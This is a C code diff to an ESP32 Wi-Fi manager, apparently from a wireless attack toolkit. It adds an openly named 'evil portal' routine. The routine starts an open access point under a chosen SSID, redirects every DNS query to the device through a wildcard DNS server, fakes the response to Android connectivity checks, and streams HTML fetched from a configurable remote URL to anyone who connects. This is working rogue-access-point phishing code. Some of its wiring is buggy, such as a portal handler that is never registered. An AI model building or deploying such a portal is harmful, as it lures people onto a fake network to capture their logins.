@@ -2,6 +2,8 @@
 
 #include "managers/wifi_manager.h"
 #include "managers/rgb_manager.h"
+#include "managers/ap_manager.h"
+#include "managers/settings_manager.h"
 #include "freertos/FreeRTOS.h"
 #include "freertos/event_groups.h"
 #include "esp_wifi.h"
@@ -11,18 +13,28 @@
 #include <sys/time.h>
 #include <string.h>
 #include <esp_random.h>
-#include "managers/ap_manager.h"
 #include <ctype.h>
 #include <stdio.h>
-#include "managers/settings_manager.h"
+#include <dhcpserver/dhcpserver.h>
+#include "esp_http_client.h"
+#include "lwip/lwip_napt.h"
+#include <esp_http_server.h>
+#include <core/dns_server.h>
+#include "esp_crt_bundle.h"
 
+
+#define CHUNK_SIZE 4096
 
 uint16_t ap_count;
 wifi_ap_record_t* scanned_aps;
 const char *TAG = "WiFiManager";
+char* PORTALURL = "";
 EventGroupHandle_t wifi_event_group;
 const int WIFI_CONNECTED_BIT = BIT0;
 wifi_ap_record_t selected_ap;
+dns_server_handle_t dns_handle;
+esp_netif_t* wifiAP;
+esp_netif_t* wifiSTA;
 
 typedef enum {
     COMPANY_DLINK,
@@ -42,16 +54,44 @@ static void tolower_str(const uint8_t *src, char *dst) {
     dst[32] = '\0'; // Ensure null-termination
 }
 
-static int compare_ap_ssid_case_insensitive(const wifi_ap_record_t *ap1, const wifi_ap_record_t *ap2) {
-    char ssid1_lower[33];
-    char ssid2_lower[33];
-
-    
-    tolower_str(ap1->ssid, ssid1_lower);
-    tolower_str(ap2->ssid, ssid2_lower);
-
-    
-    return strcmp(ssid1_lower, ssid2_lower);
+static void event_handler(void* arg, esp_event_base_t event_base,
+                          int32_t event_id, void* event_data) {
+    if (event_base == WIFI_EVENT) {
+        switch (event_id) {
+            case WIFI_EVENT_AP_START:
+                ESP_LOGI(TAG, "AP started");
+                break;
+            case WIFI_EVENT_AP_STOP:
+                ESP_LOGI(TAG, "AP stopped");
+                break;
+            case WIFI_EVENT_AP_STACONNECTED:
+                ESP_LOGI(TAG, "Station connected to AP");
+                break;
+            case WIFI_EVENT_AP_STADISCONNECTED:
+                ESP_LOGI(TAG, "Station disconnected from AP");
+                break;
+            case WIFI_EVENT_STA_START:
+                ESP_LOGI(TAG, "STA started");
+                esp_wifi_connect();
+                break;
+            case WIFI_EVENT_STA_DISCONNECTED:
+                ESP_LOGI(TAG, "Disconnected from Wi-Fi, retrying...");
+                esp_wifi_connect();
+                break;
+            default:
+                break;
+        }
+    } else if (event_base == IP_EVENT) {
+        switch (event_id) {
+            case IP_EVENT_STA_GOT_IP:
+                break;
+            case IP_EVENT_AP_STAIPASSIGNED:
+                ESP_LOGI(TAG, "Assigned IP to STA");
+                break;
+            default:
+                break;
+        }
+    }
 }
 
 // OUI lists for each company
@@ -130,10 +170,13 @@ const char *actiontec_ouis[] = {
 static void wifi_event_handler(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data) {
     if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
         ESP_LOGI(TAG, "WiFi started, ready to scan.");
+        vTaskDelay(pdMS_TO_TICKS(100));
+        esp_wifi_connect();
     } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
         ESP_LOGI(TAG, "Disconnected from WiFi");
         xEventGroupClearBits(wifi_event_group, WIFI_CONNECTED_BIT);
-    } else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
+    }
+    else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
         ip_event_got_ip_t *event = (ip_event_got_ip_t *)event_data;
         ESP_LOGI(TAG, "Got IP: " IPSTR, IP2STR(&event->ip_info.ip));
         xEventGroupSetBits(wifi_event_group, WIFI_CONNECTED_BIT);
@@ -255,6 +298,203 @@ void wifi_stations_sniffer_callback(void *buf, wifi_promiscuous_pkt_type_t type)
     }
 }
 
+esp_err_t stream_remote_html(httpd_req_t *req) {
+    // HTTPS client configuration
+    esp_http_client_config_t config = {
+        .url = PORTALURL,
+        .timeout_ms = 5000,  // Set 5 seconds timeout
+        .crt_bundle_attach = esp_crt_bundle_attach,  // Use certificate bundle for root CA validation
+        .transport_type = HTTP_TRANSPORT_OVER_SSL,
+        .user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",  // Browser-like User-Agent string
+    };
+
+    // Initialize HTTP client
+    esp_http_client_handle_t client = esp_http_client_init(&config);
+    if (client == NULL) {
+        ESP_LOGE(TAG, "Failed to initialize HTTP client");
+        return ESP_FAIL;
+    }
+
+    // Open the connection with the server
+    esp_err_t err = esp_http_client_open(client, 0);  // 0 means we are not writing any data (read-only)
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "Failed to open HTTP connection: %s", esp_err_to_name(err));
+        esp_http_client_cleanup(client);
+        return ESP_FAIL;
+    }
+
+    // Fetch the HTTP headers
+    int content_length = esp_http_client_fetch_headers(client);
+    ESP_LOGI(TAG, "Content length: %d", content_length);
+
+    // Set the HTTP response content type for the client (for HTML)
+    httpd_resp_set_type(req, "text/html");
+
+    // Buffer to hold the data being streamed
+    char *buffer = (char *)malloc(CHUNK_SIZE + 1);  // +1 for null terminator
+    if (buffer == NULL) {
+        ESP_LOGE(TAG, "Failed to allocate memory for buffer");
+        esp_http_client_cleanup(client);
+        return ESP_FAIL;
+    }
+
+    // Stream the response content in chunks
+    int read_len;
+    while ((read_len = esp_http_client_read(client, buffer, CHUNK_SIZE)) > 0) {
+        buffer[read_len] = '\0';  // Null-terminate for safety in logging
+        ESP_LOGI(TAG, "Read %d bytes from server", read_len);
+
+        // Send the chunk to the HTTP client
+        if (httpd_resp_send_chunk(req, buffer, read_len) != ESP_OK) {
+            ESP_LOGE(TAG, "Failed to send chunk to client");
+            break;
+        }
+    }
+
+    // Check if reading ended properly
+    if (read_len == 0) {
+        ESP_LOGI(TAG, "Finished reading all data from server (end of content)");
+    } else if (read_len < 0) {
+        ESP_LOGE(TAG, "Failed to read response, read_len: %d", read_len);
+    }
+
+    // Free the buffer
+    free(buffer);
+
+    // Close the connection and cleanup
+    esp_http_client_close(client);
+    esp_http_client_cleanup(client);
+
+    // Send the last chunk indicating end of response
+    httpd_resp_send_chunk(req, NULL, 0);  // NULL, 0 marks the end of the chunked response
+
+    return ESP_OK;
+}
+
+esp_err_t portal_handler(httpd_req_t *req) {
+    ESP_LOGI(TAG, "Client requested URL: %s", req->uri);
+    esp_err_t err = stream_remote_html(req);
+    if (err != ESP_OK) {
+        const char *error_message = "<html><body><h1>Failed to fetch portal content</h1></body></html>";
+        httpd_resp_set_type(req, "text/html");
+        httpd_resp_send(req, error_message, strlen(error_message));
+    }
+
+    return ESP_OK;
+}
+
+esp_err_t connectivity_check_handler(httpd_req_t *req) {
+    ESP_LOGI(TAG, "Received connectivity check from Android device");
+
+    // Send a basic HTML response (do NOT return 204 No Content)
+    const char *response = "<html><body><h1>Captive Portal Detected</h1></body></html>";
+    httpd_resp_send(req, response, strlen(response));
+    return ESP_OK;
+}
+
+httpd_handle_t start_portal_webserver(void) {
+    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
+    httpd_handle_t server = NULL;
+    if (httpd_start(&server, &config) == ESP_OK) {
+        httpd_uri_t portal_uri = {
+            .uri      = "/",
+            .method   = HTTP_GET,
+            .handler  = connectivity_check_handler,
+            .user_ctx = NULL
+        };
+        httpd_uri_t portal_uri_android = {
+            .uri      = "/generate_204",
+            .method   = HTTP_GET,
+            .handler  = connectivity_check_handler,
+            .user_ctx = NULL
+        };
+        httpd_register_uri_handler(server, &portal_uri);
+        httpd_register_uri_handler(server, &portal_uri_android);
+    }
+    return server;
+}
+
+void wifi_manager_start_evil_portal(const char *URL, const char *SSID, const char *Password, const char* ap_ssid)
+{
+
+    if (strlen(URL) > 0)
+    {
+        PORTALURL = URL;
+    }
+
+    ap_manager_stop_services();
+
+    esp_netif_dns_info_t dnsserver;
+
+    uint32_t my_ap_ip = esp_ip4addr_aton("192.168.4.1");
+
+    esp_netif_ip_info_t ipInfo_ap;
+    ipInfo_ap.ip.addr = my_ap_ip;
+    ipInfo_ap.gw.addr = my_ap_ip;
+    esp_netif_set_ip4_addr(&ipInfo_ap.netmask, 255,255,255,0);
+    esp_netif_dhcps_stop(wifiAP); // stop before setting ip WifiAP
+    esp_netif_set_ip_info(wifiAP, &ipInfo_ap);
+    esp_netif_dhcps_start(wifiAP);
+
+    wifi_config_t wifi_config = { 0 };
+        wifi_config_t ap_config = {
+        .ap = {
+            .channel = 0,
+            .authmode = WIFI_AUTH_WPA2_WPA3_PSK,
+            .ssid_hidden = 0,
+            .max_connection = 8,
+            .beacon_interval = 100,
+        }
+    };      
+
+    strlcpy((char*)wifi_config.sta.ssid, SSID, sizeof(wifi_config.sta.ssid));
+    strlcpy((char*)wifi_config.sta.password, Password, sizeof(wifi_config.sta.password));
+
+
+    strlcpy((char*)ap_config.sta.ssid, ap_ssid, sizeof(ap_config.sta.ssid));
+    ap_config.ap.authmode = WIFI_AUTH_OPEN;   
+
+    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA) );
+
+    
+
+    dhcps_offer_t dhcps_dns_value = OFFER_DNS;
+    esp_netif_dhcps_option(wifiAP,ESP_NETIF_OP_SET, ESP_NETIF_DOMAIN_NAME_SERVER, &dhcps_dns_value, sizeof(dhcps_dns_value));                           
+
+    dnsserver.ip.u_addr.ip4.addr = esp_ip4addr_aton("192.168.4.1");
+    dnsserver.ip.type = ESP_IPADDR_TYPE_V4;
+    esp_netif_set_dns_info(wifiAP, ESP_NETIF_DNS_MAIN, &dnsserver);
+
+    vTaskDelay(pdMS_TO_TICKS(100));
+
+    ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_STA, &wifi_config) );
+
+    ESP_ERROR_CHECK(esp_wifi_start());
+    xEventGroupWaitBits(wifi_event_group, WIFI_CONNECTED_BIT,
+        pdFALSE, pdTRUE, 5000 / portTICK_PERIOD_MS);
+
+    ESP_ERROR_CHECK(esp_wifi_set_config(ESP_IF_WIFI_AP, &ap_config) );
+
+    start_portal_webserver();
+
+    dns_server_config_t dns_config = {
+        .num_of_entries = 1, // Only one rule that matches all domain requests
+        .item = {
+            // Respond to all queries ("*") with the IP address 192.168.4.1
+            { .name = "*", .if_key = NULL, .ip = { .addr = ESP_IP4TOADDR(192, 168, 4, 1) } }
+        }
+    };
+
+    // Start the DNS server with the configured settings
+    dns_server_handle_t dns_handle = start_dns_server(&dns_config);
+    if (dns_handle) {
+        ESP_LOGI(TAG, "DNS server started, all requests will be redirected to 192.168.4.1");
+    } else {
+        ESP_LOGE(TAG, "Failed to start DNS server");
+    }
+}
+
+
 void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
     
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_NULL));
@@ -287,7 +527,8 @@ void wifi_manager_init() {
     // Initialize the TCP/IP stack and WiFi driver
     ESP_ERROR_CHECK(esp_netif_init());
     ESP_ERROR_CHECK(esp_event_loop_create_default());
-    esp_netif_create_default_wifi_ap();
+    wifiAP = esp_netif_create_default_wifi_ap();
+    wifiSTA = esp_netif_create_default_wifi_sta();
 
     // Initialize WiFi with default settings
     wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
@@ -323,6 +564,13 @@ void wifi_manager_init() {
 
     // Start the Wi-Fi AP
     ESP_ERROR_CHECK(esp_wifi_start());
+
+    ret = esp_crt_bundle_attach(NULL);
+    if (ret == ESP_OK) {
+        ESP_LOGI(TAG, "Global CA certificate store initialized successfully.");
+    } else {
+        ESP_LOGE(TAG, "Failed to initialize global CA certificate store: %s", esp_err_to_name(ret));
+    }
 }
 
 void wifi_manager_start_scan() {
